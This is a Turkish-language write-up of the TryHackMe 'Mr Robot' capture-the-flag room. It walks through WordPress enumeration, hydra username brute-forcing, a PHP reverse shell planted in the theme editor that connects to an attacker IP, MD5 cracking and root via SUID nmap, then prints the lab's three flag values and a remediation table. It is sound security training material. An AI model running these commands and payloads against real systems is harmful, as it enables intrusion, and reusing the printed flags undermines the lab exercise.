# 🤖 Mr Robot CTF — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Orta-yellow)
![Kategori](https://img.shields.io/badge/Kategori-Web%20%7C%20WordPress%20%7C%20SUID%20İstismarı-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

---

## 📋 Yönetici Özeti

Bu write-up, **Mr Robot CTF** makinesinin tam sömürülmesini belgelemektedir. Saldırı zinciri, `robots.txt` üzerinden bilgi ifşası, WordPress yedeklemesinden kimlik bilgisi kurtarma, WordPress tema editörü üzerinden kimlik doğrulamalı uzaktan kod yürütme ve son olarak hatalı yapılandırılmış SUID `nmap` ikili dosyası üzerinden yetki yükseltme adımlarını göstermektedir.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `gobuster` | Dizin enumerasyonu |
| `hydra` | Kullanıcı adı kaba-kuvveti |
| `john` | Parola hash kırma |
| `nc` | Ters kabuk dinleyicisi |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | filtered | SSH | OpenSSH |
| 80/tcp | açık | HTTP | Apache httpd |
| 443/tcp | açık | HTTP | Apache httpd |

### Dizin Enumerasyonu

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Keşfedilen Yollar:**

| Yol | İçerik | Önem |
|-----|--------|------|
| `/robots.txt` | Dosya ifşası | `fsocity.dic` kelime listesi ve `key-1-of-3.txt` içerir |
| `/wp-login.php` | WordPress girişi | Birincil kimlik doğrulama noktası |
| `/license` | Base64 kodlanmış kimlik bilgileri | `elliot:ER28-0652` içerir |
| `/wp-content/themes/` | WordPress temaları | Tema editörü üzerinden RCE vektörü |

---

## 🔑 Aşama 2: Key 1 — Bilgi İfşası

### robots.txt Analizi

```bash
curl http://<HEDEF_IP>/robots.txt
```

**İçerik:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Key Kurtarma

```bash
wget http://<HEDEF_IP>/key-1-of-3.txt
cat key-1-of-3.txt
```

**Key 1:** `073403c8a58a1f80d943455fb30724b9`

---

## 🎭 Aşama 3: WordPress Kimlik Bilgisi Kurtarma

### Kelime Listesi İşleme

`fsocity.dic` dosyası 858.000+ satır içerir ve büyük oranda tekrarlanan veri vardır. Kaba-kuvvet için optimize edildi:

```bash
sort fsocity.dic | uniq > fsocity-clean.dic
# 858.000 → 11.000 satır (%98,7 azalma)
```

### Kullanıcı Adı Kaba-Kuvveti

```bash
hydra -L fsocity-clean.dic -p test <HEDEF_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

**Sonuç:** Kullanıcı adı `elliot` tespit edildi.

### Parola Kurtarma

`/license` dosyası base64 kodlanmış kimlik bilgileri içerir:

```bash
curl http://<HEDEF_IP>/license | base64 -d
# elliot:ER28-0652
```

**Giriş:** `elliot / ER28-0652`

---

## 🐚 Aşama 4: Kimlik Doğrulamalı RCE ve Kabuk

### WordPress Tema Editörü İstismarı

**Görünüm → Editör → archive.php** yoluna gidildi. İçerik PHP ters kabuk ile değiştirildi:

```php
<?php
$ip = '<SALDIRGAN_IP>';
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### Ters Kabuk Yürütme

**Dinleyici:**
```bash
nc -lvnp 9001
```

**Tetikleyici:**
```
http://<HEDEF_IP>/wp-content/themes/twentyfifteen/archive.php
```

**Sonuç:** `daemon` kullanıcısı olarak kabuk elde edildi.

---

## 🏴 Aşama 5: Kullanıcı Flag'i (Key 2)

### robot'a Yatay Hareket

`/home/robot` dizininde iki dosya bulundu:
- `key-2-of-3.txt` — okunamaz (robot sahipliği)
- `password.raw-md5` — MD5 hash, okunabilir

### Hash Çıkarımı ve Kırma

```bash
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Sonuç:** `abcdefghijklmnopqrstuvwxyz`

### İnteraktif Kabuk Yükseltme

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Parola: abcdefghijklmnopqrstuvwxyz
```

### Key 2 Kurtarma

```bash
cat /home/robot/key-2-of-3.txt
```

**Key 2:** `822c73956184f694993bede3eb39f959`

---

## 🚀 Aşama 6: Yetki Yükseltme ve Root

### SUID İkili Dosya Enumerasyonu

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Kritik Bulgu:** `/usr/local/bin/nmap` SUID biti ile ayarlanmış.

### nmap SUID İstismarı

GTFOBins, nmap interaktif modunun kabuk oluşturduğunu doğrular:

```bash
/usr/local/bin/nmap --interactive
nmap> !sh
whoami
# root
```

### Key 3 Kurtarma

```bash
cat /root/key-3-of-3.txt
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 🗺️ Saldırı Zinciri Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22(filtered), 80, 443]
    │                │
    │                ▼
    │        [gobuster: /robots.txt, /wp-login.php, /license]
    │                │
    │                ▼
    │        [robots.txt: key-1-of-3.txt + fsocity.dic]
    │                │
    │                ▼
    │        [Key 1: 073403c8a58a1f80d943455fb30724b9]
    │                │
    │                ▼
    │        [fsocity.dic işleme: 858K → 11K benzersiz]
    │                │
    │                ▼
    │        [hydra: kullanıcı adı = elliot]
    │                │
    │                ▼
    │        [/license: base64 decode → elliot:ER28-0652]
    │                │
    │                ▼
    │        [WordPress admin girişi]
    │                │
    │                ▼
    │        [Tema Editörü: archive.php → ters kabuk]
    │                │
    │                ▼
    │        [daemon olarak kabuk]
    │                │
    │                ▼
    │        [/home/robot: password.raw-md5]
    │                │
    │                ▼
    │        [john: abcdefghijklmnopqrstuvwxyz]
    │                │
    │                ▼
    │        [su robot → Key 2: 822c73956184f694993bede3eb39f959]
    │                │
    │                ▼
    │        [SUID nmap → !sh]
    │                │
    │                ▼
    └────────► [Root kabuğu → Key 3: 04787ddef27c3dee1ee161b21670b4e4]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | CVSS | Çözüm |
|---|---------|--------|------|-------|
| 1 | **Hassas Dosya İfşası (robots.txt)** | 🔴 Kritik | 8.6 | Hassas dosyaları web kökünden kaldır; uygun erişim kontrolleri uygula |
| 2 | **WordPress Yedekleme Maruziyeti** | 🔴 Kritik | 9.1 | Yedekleme dosyası erişimini kısıtla; web kökü dışında sakla; yedeklemeleri şifrele |
| 3 | **Zayıf Parola Hash'i (MD5)** | 🔴 Kritik | 9.8 | bcrypt/Argon2'ye geç; güçlü parola politikaları zorla |
| 4 | **WordPress Tema Editörü RCE** | 🔴 Kritik | 9.9 | Tema/eklenti editörünü devre dışı bırak; dosya izinlerini kısıtla; WAF kuralları uygula |
| 5 | **SUID nmap Hatalı Yapılandırması** | 🔴 Kritik | 9.0 | nmap'ten SUID bitini kaldır; ayrıcalıklı işlemler için özel ikili dosyalar kullan |
| 6 | **SSH Filtered/Açık** | 🟠 Yüksek | 7.5 | Güvenlik duvarı kurallarını düzgün yapılandır; SSH'yi kesin olarak aç veya kapat |

---

## 🎓 Temel Çıkarımlar

1. **robots.txt güvenlik değildir:** Saldırganlara nereye bakacaklarını açıkça söyler — asla hassas dosyalar burada tutulmamalı
2. **WordPress tema editörü = RCE vektörü:** Herhangi bir admin seviyesi ele geçirme, anında kod yürütme anlamına gelir
3. **MD5 kırılmıştır:** Gökkuşağı tabloları MD5'i saniyeler içinde kırar — parola depolama için asla kullanılmamalı
4. **SUID ikili dosyalar tehlikelidir:** SUID ile nmap bilinen istismar vektörüdür — tüm SUID dosyaları düzenli olarak denetle
5. **Lisans dosyaları kimlik bilgisi sızdırır:** Base64 şifreleme değildir — her zaman "gizli" dosyaları incele

---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **Key 1** | `/key-1-of-3.txt` | `073403c8a58a1f80d943455fb30724b9` |
| **Key 2** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| **Key 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---

**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
